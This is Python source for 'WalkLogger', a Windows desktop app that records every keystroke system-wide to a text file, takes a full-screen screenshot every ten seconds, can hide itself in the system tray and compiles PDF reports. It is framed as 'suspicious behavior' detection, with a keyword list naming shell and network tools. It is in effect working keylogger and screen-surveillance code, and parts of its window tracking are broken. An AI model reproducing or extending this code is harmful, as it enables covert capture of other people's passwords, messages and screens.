import tkinter as tk
from tkinter import messagebox, Menu, ttk
from pynput import keyboard
import threading
import time
import os
from PIL import ImageGrab, Image, ImageDraw
import pystray
import re
from fpdf import FPDF
import win32gui  # Used for getting the active window title

# === CONFIGURATION ===
log_file = "keylog.txt"
screenshot_folder = "screenshots"
behavior_log_file = "suspicious_behavior.txt"
screenshot_interval = 10  # seconds
pdf_report_file = "walklogger_report.pdf"

suspicious_keywords = [
    "cmd", "powershell", "terminal", "reverse", "shell", "curl",
    "wget", "python", "rm -rf", "sudo", "msfconsole", "netcat",
    "nmap", "proxychains", "keylogger", "malware", "trojan", "bot"
]

# Create screenshots directory if not exists
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

log = ""
is_logging = False
listener = None
current_window_title = ""

# === GUI ===
class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("WalkLogger")
        self.root.configure(bg="#121212")
        self.create_widgets()
        self.type_header()

    def create_widgets(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TButton", background="#212121", foreground="#00FF00", padding=6, relief="flat")
        style.configure("TLabel", background="#121212", foreground="#00FF00")

        self.title_label = tk.Label(self.root, text="☠ WALKLOGGER ☠", font=("Consolas", 18, "bold"), fg="#39FF14", bg="#121212")
        self.title_label.pack(pady=10)

        self.status_label = tk.Label(self.root, text="Status: Not Logging", fg="red", bg="#121212", font=("Consolas", 10))
        self.status_label.pack(pady=5)

        self.output_text = tk.Text(self.root, height=12, width=70, state='disabled', bg="#000000", fg="#00FF00", insertbackground='#00FF00', font=("Courier New", 9))
        self.output_text.pack(pady=10)

        self.display = tk.BooleanVar()
        self.display.set(True)
        tk.Checkbutton(self.root, text="Display Keystrokes", variable=self.display, bg="#121212", fg="#00FF00", selectcolor="#121212").pack()

        self.start_btn = ttk.Button(self.root, text="▶ Start Logging", command=start_logging)
        self.start_btn.pack(side='left', padx=20, pady=10)

        self.stop_btn = ttk.Button(self.root, text="■ Stop Logging", command=stop_logging)
        self.stop_btn.pack(side='right', padx=20, pady=10)

    def type_header(self):
        text = "☠ WALKLOGGER ☠"
        self.title_label.config(text="")
        for i in range(len(text)):
            self.root.after(i * 100, lambda i=i: self.update_header(text[i]))

    def update_header(self, char):
        current_text = self.title_label.cget("text")
        self.title_label.config(text=current_text + char)

# === Behavior Detection ===
def analyze_behavior(current_log):
    suspicious_hits = []
    for word in suspicious_keywords:
        pattern = r"\b" + re.escape(word) + r"\b"
        if re.search(pattern, current_log.lower()):
            suspicious_hits.append(word)

    if suspicious_hits:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(behavior_log_file, "a") as f:
            f.write(f"[{timestamp}] Suspicious Activity Detected: {', '.join(suspicious_hits)}\n")
        show_popup_alert(f"Suspicious behavior: {', '.join(suspicious_hits)}")
        create_pdf_report()

def show_popup_alert(message):
    app.status_label.config(text=f"⚠️ Alert: {message}", fg="orange")
    messagebox.showwarning("Suspicious Behavior", message)

# === Active Window Tracking ===
def get_active_window_title():
    global current_window_title
    def callback(hwnd, extra):
        if win32gui.IsWindowVisible(hwnd):
            window_title = win32gui.GetWindowText(hwnd)
            if window_title != "":
                current_window_title = window_title

    win32gui.EnumWindows(callback, None)

# === Keylogger ===
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += ' '
        elif key == key.enter:
            log += '\n'
        else:
            log += f'[{key.name}]'

    if app.display.get():
        app.output_text.configure(state='normal')
        app.output_text.insert('end', f'{key} ')
        app.output_text.configure(state='disabled')

    analyze_behavior(log)

def start_logging():
    global is_logging, listener
    if not is_logging:
        is_logging = True
        app.status_label.config(text="Status: Logging", fg="green")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        save_log()
        take_screenshot()

def stop_logging():
    global is_logging, listener
    if is_logging:
        is_logging = False
        app.status_label.config(text="Status: Not Logging", fg="red")
        if listener:
            listener.stop()
            listener = None

def save_log():
    if is_logging:
        with open(log_file, "a") as f:
            f.write(log)
        threading.Timer(10, save_log).start()

def take_screenshot():
    if is_logging:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(path)
        threading.Timer(screenshot_interval, take_screenshot).start()

# === PDF Report ===
def create_pdf_report():
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    
    # Add log data
    pdf.cell(200, 10, txt="Suspicious Activity Log:", ln=True)
    with open(behavior_log_file, "r") as f:
        logs = f.readlines()
    for log in logs:
        pdf.multi_cell(0, 10, txt=log)
    
    # Add screenshots
    pdf.cell(200, 10, txt="Screenshots:", ln=True)
    for screenshot in os.listdir(screenshot_folder):
        screenshot_path = os.path.join(screenshot_folder, screenshot)
        pdf.cell(200, 10, txt=screenshot, ln=True)
        pdf.image(screenshot_path, x=None, y=None, w=100)

    # Save PDF
    pdf.output(pdf_report_file)

# === Tray Icon ===
def create_tray_icon():
    image = Image.new("RGB", (64, 64), (0, 0, 0))
    dc = ImageDraw.Draw(image)
    dc.text((10, 20), "WL", fill="lime")

    def on_show(icon, item):
        root.after(0, show_window)
        icon.stop()

    def on_exit(icon, item):
        icon.stop()
        root.after(0, root.quit)

    icon = pystray.Icon("WalkLogger", image, "WalkLogger", menu=pystray.Menu(
        pystray.MenuItem("Show", on_show),
        pystray.MenuItem("Exit", on_exit)
    ))

    icon.run()

def hide_window():
    root.withdraw()
    tray_thread = threading.Thread(target=create_tray_icon, daemon=True)
    tray_thread.start()

def show_window():
    root.deiconify()

# === Main ===
root = tk.Tk()
app = KeyloggerApp(root)

menu = Menu(root)
root.config(menu=menu)
menu.add_command(label="Hide Window", command=hide_window)
menu.add_command(label="Exit", command=root.quit)

root.mainloop()
